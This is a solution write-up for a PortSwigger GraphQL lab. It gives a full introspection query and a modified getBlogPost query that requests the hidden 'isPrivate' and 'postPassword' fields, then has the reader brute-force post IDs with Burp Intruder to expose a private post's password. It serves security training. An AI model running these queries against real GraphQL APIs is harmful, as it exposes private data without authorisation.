----

### Lab description

The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

For more information on using InQL, see [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql).

### Lab Solution

- Use the introspection query bellow: 

```
{"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n      }\n    }\n  }\n}\n"}
```

- Look at the structure of the `__schema` and search for `password`

![](/static/img/Pasted_image_20230703161321.png)

- Click on any post, and look at the request

![](/static/img/Pasted_image_20230703161424.png)

- Insert the "hidden" params from the `__schema`  `isPrivate` and `postPassword`: 
  
  ```
  {"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            isPrivate\n        postPassword\n}\n    }","operationName":"getBlogPost","variables":{"id":3}}

  ```

- Use intruder to iterate over the ID's

![](/static/img/Pasted_image_20230703161952.png)

- When you found the "hidden" post, look at the response and search for password.

- Copy the password from response and past at the header lab

![](/static/img/Pasted_image_20230703161052.png)